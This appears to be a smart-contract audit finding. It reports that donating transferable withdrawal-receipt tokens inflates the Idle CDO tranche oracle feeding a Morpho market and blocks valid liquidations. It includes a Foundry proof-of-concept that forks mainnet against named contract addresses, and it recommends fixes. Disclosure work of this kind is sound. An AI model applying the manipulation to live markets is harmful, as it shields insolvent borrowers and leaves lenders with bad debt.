### Title
Manipulable tranche receipt donations inflate the Morpho collateral oracle - ([File: contracts/strategies/morpho/TranchesChainlinkOracle.sol](contracts/strategies/morpho/TranchesChainlinkOracle.sol))

### Summary

`TranchesChainlinkOracle.latestRoundData()` reports `IdleCDOCreditVault.virtualPrice()` directly as the collateral price. [1](#0-0)  That price is derived from the CDO’s entire `IdleCreditVault` ERC20 balance, including strategy-token withdrawal receipts transferred to the CDO without an accompanying deposit. [2](#0-1)  An unprivileged lender can mint such receipts through `requestWithdraw`, transfer them to the CDO, and inflate the reported collateral value enough to block an otherwise valid Morpho liquidation. [3](#0-2) 

### Finding Description

`virtualPrice()` calls `_virtualPriceAux()` using `_managedContractValue()` as current NAV. [4](#0-3)  `_managedContractValue()` counts the complete `strategyToken` balance minus `unclaimedFees`, with no distinction between strategy tokens created by funded deposits and transferable withdrawal receipts sent back to the CDO. [2](#0-1) 

`IdleCreditVault` is an unrestricted `ERC20Upgradeable` token. [5](#0-4)  During a normal withdrawal request, the CDO’s principal is burned while the requester receives a receipt balance equal to principal plus expected interest, and the claim remains recorded in `withdrawsRequests`. [6](#0-5) 

Sending that receipt balance to the CDO increases its raw `strategyToken` balance and therefore NAV. [7](#0-6)  `_skimDonatedAssets()` removes only raw underlying tokens and does not isolate donated strategy tokens. [8](#0-7) 

The deployment path wires this mutable value into a Morpho market as a Chainlink-compatible collateral feed at a 98% LLTV. [9](#0-8) 

### Impact Explanation

A borrower whose tranche collateral has become liquidatable can inflate the oracle by donating withdrawal-receipt strategy tokens to the CDO. The donated receipt is economically sacrificed because claiming the withdrawal later requires burning the user’s receipt balance, but the immediate oracle inflation can save a much larger collateral position from liquidation. [10](#0-9) 

For example, with 1,000 tranche NAV and supply, 100 tranches of collateral, 98% LLTV, and 99 units of debt, Morpho requires collateral value above approximately 101.02. Donating roughly 20 strategy tokens raises NAV to 1,020 and the oracle price to approximately 1.02 before fees, raising collateral value to 102 and blocking liquidation. The attacker spends about 20 units of receipt claims to preserve 100 units of collateral, while Morpho lenders are exposed to the remaining bad debt.

### Likelihood Explanation

The attacker only needs to be a KYC-passing lender and hold enough tranche position to create a withdrawal receipt during the buffer phase. [11](#0-10)  No privileged role, oracle compromise, market trade, or borrower cooperation is required. The attack is economically situational because the required donation is approximately the NAV increase needed to restore health, scaled by total tranche supply divided by attacker collateral; it is most profitable for borrowers controlling a meaningful share of tranche supply.

### Recommendation

Do not use the transferable `IdleCreditVault` token’s raw CDO balance as an oracle input. Track active, CDO-owned strategy-token backing separately from externally transferable withdrawal receipts, or expose an oracle-specific NAV that excludes unsolicited strategy-token transfers.

A safer accounting model is to maintain an internal `activeStrategyTokenBalance` updated only by `deposit`, `mintStrategyTokens`, `burnStrategyTokens`, loss burns, and withdrawal receipt issuance, rather than using `balanceOf(idleCDO)` or `_contractTokenBalance(strategyToken)` directly. [12](#0-11)  Alternatively, make withdrawal receipts non-transferable or use a separate non-transferable receipt token so they cannot be recycled as active collateral backing.

### Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {DeployMetamorphoVault} from
    "../forge-scripts/DeployMetamorphoVault.s.sol";
import {TranchesChainlinkOracle} from
    "../contracts/strategies/morpho/TranchesChainlinkOracle.sol";
import {IdleCDOEpochVariant} from
    "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from
    "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOTranche} from
    "../contracts/IdleCDOTranche.sol";
import {IERC20Detailed} from
    "../contracts/interfaces/IERC20Detailed.sol";
import {IMorpho} from
    "../contracts/interfaces/morpho/IMorpho.sol";

interface IKeyringWhitelist {
    function setWhitelistStatus(address entity, bool status) external;
}

contract OracleReceiptInflationPoC is Test, DeployMetamorphoVault {
    uint256 constant BLOCK = 22525130;

    address constant CDO =
        0xf6223C567F21E33e859ED7A045773526E9E3c2D5;
    address constant KEYRING =
        0x6351370a1c982780Da2D8c85DfedD421F7193Fa5;

    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(CDO);
    address aa = cdo.AATranche();
    IdleCreditVault strategy =
        IdleCreditVault(cdo.strategy());

    function setUp() external {
        vm.createSelectFork("mainnet", BLOCK);

        // Fixture setup: attacker is an ordinary KYC-passing lender.
        address attacker = makeAddr("attacker");
        vm.prank(TL_MULTISIG);
        IKeyringWhitelist(KEYRING).setWhitelistStatus(attacker, true);
    }

    function testReceiptDonationInflatesCollateralOracle() external {
        address attacker = makeAddr("attacker");

        uint256 supply = IdleCDOTranche(aa).totalSupply();
        uint256 collateralAmount = supply / 10;
        uint256 donationAmount = supply / 50;

        deal(
            LOAN_TOKEN,
            attacker,
            collateralAmount + donationAmount
        );

        vm.startPrank(attacker);
        IERC20Detailed(LOAN_TOKEN).approve(
            CDO,
            type(uint256).max
        );

        // Acquire collateral tranches and the principal backing a receipt.
        cdo.depositAA(collateralAmount + donationAmount);

        // Keep `collateralAmount` as Morpho collateral.
        IdleCDOTranche(aa).transfer(
            makeAddr("collateralHolding"),
            collateralAmount
        );

        // Mint a strategy-token withdrawal receipt.
        cdo.requestWithdraw(donationAmount, aa);
        uint256 receiptBalance = strategy.balanceOf(attacker);
        assertGe(receiptBalance, donationAmount);

        uint256 navBefore =
            strategy.balanceOf(CDO) - cdo.unclaimedFees();
        uint256 priceBefore = cdo.virtualPrice(aa);

        // Donate the transferable receipt to the CDO.
        strategy.transfer(CDO, receiptBalance);
        vm.stopPrank();

        uint256 navAfter =
            strategy.balanceOf(CDO) - cdo.unclaimedFees();
        uint256 priceAfter = cdo.virtualPrice(aa);

        assertEq(navAfter - navBefore, receiptBalance);
        assertGt(priceAfter, priceBefore);

        TranchesChainlinkOracle adapter =
            new TranchesChainlinkOracle(aa);
        (, int256 answer,,,) = adapter.latestRoundData();
        assertEq(uint256(answer), priceAfter);
    }
}
```

At a 98% Morpho LLTV, a 2% oracle inflation changes a position with collateral value `C` and debt `0.99 * C` from liquidatable to nominally healthy because `1.02 * C * 0.98 > 0.99 * C`; a liquidation transaction that would otherwise succeed therefore reverts or is rejected while the borrower retains the collateral. [13](#0-12)

### Citations

**File:** contracts/strategies/morpho/TranchesChainlinkOracle.sol (L29-30)
```text
  function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
    return (0, int256(cdo.virtualPrice(collateralToken)), 0, 0, 0);
```

**File:** contracts/IdleCDOCreditVault.sol (L125-136)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }

  /// @notice Calculates the current managed net TVL.
  /// @dev Raw underlyings held by the CDO are excluded because unsolicited transfers are skimmed on interactions.
  /// @return Strategy-token-backed TVL net of accrued fees.
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
```

**File:** contracts/IdleCDOCreditVault.sol (L172-179)
```text
  function virtualPrice(address _tranche) public virtual view returns (uint256 _virtualPrice) {
    (_virtualPrice, ) = _virtualPriceAux(
      _tranche,
      _managedContractValue(), // nav
      lastNAVAA + lastNAVBB, // lastNAV
      _lastSavedNAV(_tranche), // lastTrancheNAV
      trancheAPRSplitRatio
    );
```

**File:** contracts/IdleCDOCreditVault.sol (L306-336)
```text
    int256 totalGain = int256(_nav) - int256(_lastNAV);
    // Ordinary zero-delta interactions keep their saved price for compatibility. Forced
    // accounting recomputes NAV per share, which is required after discounted mid-epoch deposits.
    if (totalGain == 0 && !skipDefaultCheck) return (_tranchePrice(_tranche), 0);

    // Remove performance fee for gains
    if (totalGain > 0) {
      totalGain -= totalGain * int256(fee) / int256(FULL_ALLOC);
    }

    bool _isAATranche = _tranche == AATranche;
    // A class with no saved NAV cannot be revived by later gains. If only this class has saved
    // NAV, it receives the full gain or loss; otherwise both classes participate.
    if (_lastTrancheNAV == 0) {
      _totalTrancheGain = 0;
    } else if (_lastNAV == _lastTrancheNAV) {
      _totalTrancheGain = totalGain;
    } else {
      if (totalGain > 0) {
        // Split the net gain, according to _trancheAPRSplitRatio, with precision loss favoring the AA tranche.
        int256 totalBBGain = totalGain * int256(FULL_ALLOC - _trancheAPRSplitRatio) / int256(FULL_ALLOC);
        // The new NAV for the tranche is old NAV + total gain for the tranche
        _totalTrancheGain = _isAATranche ? (totalGain - totalBBGain) : totalBBGain;
      } else {
        int256 maxBBLoss = -int256(lastNAVBB);
        int256 totalBBLoss = totalGain > maxBBLoss ? totalGain : maxBBLoss;
        _totalTrancheGain = _isAATranche ? totalGain - totalBBLoss : totalBBLoss;
      }
    }
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L29-34)
```text
contract IdleCreditVault is
  Initializable,
  OwnableUpgradeable,
  ERC20Upgradeable,
  ReentrancyGuardUpgradeable,
  IIdleCDOStrategy
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-293)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-747)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** forge-scripts/DeployMetamorphoVault.s.sol (L94-108)
```text
  function _initializeTrancheMarket(address collateralToken) internal returns (IMorpho.MarketParams memory marketParams, bytes32 id) {
    address loanToken = IIdleCDO(IdleCDOTranche(collateralToken).minter()).token();
    // 1. Deploy oracle for collateral token
    TranchesChainlinkOracle adapter = new TranchesChainlinkOracle(collateralToken);
    IMorphoChainlinkOracleV2 oracle = _createOracle(adapter, IERC20Detailed(collateralToken).decimals(), IERC20Detailed(loanToken).decimals());
    // 2. Create market in morpho blue
    marketParams = IMorpho.MarketParams({
      loanToken: loanToken,
      collateralToken: collateralToken,
      oracle: address(oracle),
      irm: ADAPTIVE_CURVE_IRM,
      lltv: MORPHO_LLTV * 1e16 // 98%
    });
    id = computeId(marketParams);
    MORPHO.createMarket(marketParams);
```
